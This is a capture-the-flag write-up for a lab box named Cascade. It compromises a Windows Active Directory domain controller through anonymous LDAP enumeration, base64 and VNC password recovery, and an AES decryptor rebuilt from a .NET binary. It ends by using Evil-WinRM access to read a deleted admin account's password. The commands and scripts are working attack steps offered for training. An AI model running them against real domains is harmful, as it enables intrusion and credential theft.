## Cascade

### Lab Details 

- Difficulty: Medium
- Type:  SQL, Binary Investigation, Active Directory, Windows

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-29 18:35:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
```
- anonymously enumerate users `windapsearch.py`
```bash
$ python windapsearch.py -u "" --dc-ip 10.129.47.77 -U --admin-objects
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.129.47.77
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=cascade,DC=local
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 15 users: 

cn: CascGuest
userPrincipalName: CascGuest@cascade.local

cn: ArkSvc
userPrincipalName: arksvc@cascade.local

cn: Steve Smith
userPrincipalName: s.smith@cascade.local

cn: Ryan Thompson
userPrincipalName: r.thompson@cascade.local

cn: Util
userPrincipalName: util@cascade.local

cn: James Wakefield
userPrincipalName: j.wakefield@cascade.local

cn: Stephanie Hickson
userPrincipalName: s.hickson@cascade.local

cn: John Goodhand
userPrincipalName: j.goodhand@cascade.local

cn: Adrian Turnbull
userPrincipalName: a.turnbull@cascade.local

cn: Edward Crowe
userPrincipalName: e.crowe@cascade.local

cn: Ben Hanson
userPrincipalName: b.hanson@cascade.local

cn: David Burman
userPrincipalName: d.burman@cascade.local

cn: BackupSvc
userPrincipalName: BackupSvc@cascade.local

cn: Joseph Allen
userPrincipalName: j.allen@cascade.local

cn: Ian Croft
userPrincipalName: i.croft@cascade.local

[+] Attempting to enumerate all admin (protected) objects
[+]	Found 0 Admin Objects:


[*] Bye!
```
- enumerate users with `Remote Management Users`
```bash
$ python windapsearch.py -u "" --dc-ip 10.129.47.77 -U -m "Remote Management Users"
<SNIP>
[+] Attempting to enumerate full DN for group: Remote Management Users
[+]	 Using DN: CN=Remote Management Users,OU=Groups,OU=UK,DC=cascade,DC=local

[+]	 Found 2 members:

b'CN=Steve Smith,OU=Users,OU=UK,DC=cascade,DC=local'
b'CN=ArkSvc,OU=Services,OU=Users,OU=UK,DC=cascade,DC=local'
```
- pipe users to a file, attempt a brute force attack, no credentials found
```bash
$ python windapsearch.py -u "" --dc-ip 10.129.47.77 -U | grep '@' | cut -d ' ' -f 2 | cut -d '@' -f 1 | uniq > ../users

$ cat users
CascGuest
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
```
- check for full user details on domain controller
```bash
python3 ./windapsearch.py -U --full --dc-ip 10.129.106.243
<snip>
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```
- `cascadeLegacyPwd` shows the connection parameter to older version of MySQL
```bash
## need to decode it
$ echo clk0bjVldmE= | base64 -d
rY4n5eva
```
- enumerate shares with the found credential 
```bash
$ nxc smb 10.129.106.243 -u r.thompson -p rY4n5eva --shares
SMB         10.129.106.243  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.106.243  445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         10.129.106.243  445    CASC-DC1         [*] Enumerated shares
SMB         10.129.106.243  445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.106.243  445    CASC-DC1         -----           -----------     ------
SMB         10.129.106.243  445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.106.243  445    CASC-DC1         Audit$                          
SMB         10.129.106.243  445    CASC-DC1         C$                              Default share
SMB         10.129.106.243  445    CASC-DC1         Data            READ            
SMB         10.129.106.243  445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.106.243  445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.129.106.243  445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.106.243  445    CASC-DC1         SYSVOL          READ            Logon server share 
```
#### Initial Foothold 
- we can access the `Data` share with user `r.thompson`, download the remote files
```bash
$ smbclient //10.129.106.243/Data -U r.thompson
Password for [WORKGROUP\r.thompson]:
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Contractors\*
NT_STATUS_ACCESS_DENIED listing \Finance\*
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Temps\*
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as IT/Email Archives/Meeting_Notes_June_2018.html (2.2 KiloBytes/sec) (average 2.2 KiloBytes/sec)
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (1.6 KiloBytes/sec) (average 2.0 KiloBytes/sec)
getting file \IT\Logs\DCs\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (7.1 KiloBytes/sec) (average 3.5 KiloBytes/sec)
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (3.2 KiloBytes/sec) (average 3.4 KiloBytes/sec)

$ tree .
.
├── Contractors
├── Finance
├── IT
│   ├── Email Archives
│   │   └── Meeting_Notes_June_2018.html
│   ├── LogonAudit
│   ├── Logs
│   │   ├── Ark AD Recycle Bin
│   │   │   └── ArkAdRecycleBin.log
│   │   └── DCs
│   │       └── dcdiag.log
│   └── Temp
│       ├── r.thompson
│       └── s.smith
│           └── VNC Install.reg
├── Production
└── Temps

14 directories, 4 files

```
- check `VNC Install.reg` under user `s.smith`
- found password in hex
```
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```
- search online for `VNC password decrypt` [found](https://github.com/frizb/PasswordDecrypts) use the method mentioned, we get the pain text
```bash
[msf](Jobs:0 Agents:0) >> irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> require 'rex/proto/rfb'
=> true
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> 
=> "\x17Rk\x06#NX\a"
>> Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), fixedkey
=> "sT333ve2"
```
#### Lateral Movement (If any)
- run bloodhound remotely and load the data to dashboard, did not find any interesting relationships
```bash
bloodhound-python -u "s.smith" -p "sT333ve2" -d cascade.local -ns 10.129.106.243 -c All
```
- check group permission of user `s.smith`
```bash
*Evil-WinRM* PS C:\Users\s.smith> net user s.smith
User name                    s.smith
Full Name                    Steve Smith
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 8:58:05 PM
Password expires             Never
Password changeable          1/28/2020 8:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   9/29/2025 8:50:18 PM

Logon hours allowed          All

Local Group Memberships      *Audit Share          *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```
- user is part of the `Audit Share` group
- the group grands permission to all shares
- check the `Audit$` share
```bash
$ smbclient \\\\10.129.106.243\\Audit$ -U s.smith
Password for [WORKGROUP\s.smith]:
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt OFF
smb: \> mget *
getting file \CascAudit.exe of size 13312 as CascAudit.exe (13.3 KiloBytes/sec) (average 13.3 KiloBytes/sec)
getting file \CascCrypto.dll of size 12288 as CascCrypto.dll (15.3 KiloBytes/sec) (average 14.2 KiloBytes/sec)
getting file \RunAudit.bat of size 45 as RunAudit.bat (0.1 KiloBytes/sec) (average 9.8 KiloBytes/sec)
getting file \System.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll (226.1 KiloBytes/sec) (average 92.4 KiloBytes/sec)
getting file \System.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll (231.3 KiloBytes/sec) (average 114.7 KiloBytes/sec)
getting file \DB\Audit.db of size 24576 as DB/Audit.db (30.5 KiloBytes/sec) (average 103.1 KiloBytes/sec)
getting file \x64\SQLite.Interop.dll of size 1639936 as x64/SQLite.Interop.dll (545.1 KiloBytes/sec) (average 253.6 KiloBytes/sec)
getting file \x86\SQLite.Interop.dll of size 1246720 as x86/SQLite.Interop.dll (684.8 KiloBytes/sec) (average 327.3 KiloBytes/sec)
```
- download all from remote
- check the `RunAudit.bat` batch file
```bash
$ cat RunAudit.bat 
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
```
- we see that its executing `CascAudit.exe` on `Audit.db`
- check the Audit file type, SQLite database file
```bash
$ file Audit.db 
Audit.db: SQLite 3.x database
```
- run `sqlitebrowser` to check for potential info
```
$ sqlitebrowser Audit.db
```
- found password for user `ArkSVC:BQO5l5Kj9MdErXx6Q6AGOw==`
![[SQLite.png]]
- however the password is encrypted
- now we will need to decompile the executable file in `dnSpy`, need a Windows operating system to run `dnSpy`
- load the executable and check main function and we see a decrypt function however the decrypt function does not exist in the executable
![[main function.png]]
- load the `DLL` file and found function
![[decryptstring function.png]]
- convert from `C#` function to `Python`
```bash
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

def decrypt_string(encrypted_string, key):
    """
    Decrypts a Base64-encoded string using AES-128-CBC
    
    Args:
        encrypted_string (str): Base64-encoded encrypted string
        key (str): 16-character key for AES-128
    
    Returns:
        str: Decrypted plaintext string
    """
    # Convert from Base64
    encrypted_bytes = base64.b64decode(encrypted_string)
    
    # Hardcoded IV from the C# code
    iv = b"1tdyjCbY1Ix49842"
    
    # Ensure key is proper length for AES-128 (16 bytes)
    key_bytes = key.encode('utf-8')
    if len(key_bytes) != 16:
        raise ValueError("Key must be exactly 16 characters for AES-128")
    
    # Create AES cipher in CBC mode
    cipher = AES.new(key_bytes, AES.MODE_CBC, iv=iv)
    
    # Decrypt
    decrypted_bytes = cipher.decrypt(encrypted_bytes)
    
    # Remove padding and decode to string
    # Note: The C# code doesn't explicitly remove padding, so we try both ways
    try:
        # Try with PKCS7 padding removal (most common)
        decrypted_text = unpad(decrypted_bytes, AES.block_size).decode('utf-8')
    except ValueError:
        # If padding removal fails, try without (like the original C# code)
        decrypted_text = decrypted_bytes.decode('utf-8').rstrip('\x00')
    
    return decrypted_text

print(decrypt_string("BQO5l5Kj9MdErXx6Q6AGOw==", "c4scadek3y654321"))
```
- run script and we get the password
```bash
$ python3 decrypt.py 
w3lc0meFr31nd
```
- get reverse shell as user `ArkSvc`
- check group mission and user belongs to `AD Recycle Bin` group
```
$ evil-winrm -i 10.129.106.243 -u ArkSvc -p w3lc0meFr31nd
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\arksvc\Documents> net user arksvc
User name                    arksvc
Full Name                    ArkSvc
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:18:20 PM
Password expires             Never
Password changeable          1/9/2020 5:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/29/2020 10:05:40 PM

Logon hours allowed          All

Local Group Memberships      *AD Recycle Bin       *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
```
- we can check deleted objects in AD give we have the permission from `AD Recycle Bin` group
```powershell
*Evil-WinRM* PS C:\> Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName=TempAdmin) (isDeleted=TRUE))" -IncludeDeletedObjects -Properties *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```
- as earlier there is a password in `cascadeLegacyPwd` field
- decrypt it with `base64`
```bash
$ echo YmFDVDNyMWFOMDBkbGVz | base64 -d
baCT3r1aN00dles
```
#### Resources

#### Lesson Learned
- Check for `cascadeLegacyPwd` when enumerating AD environments.
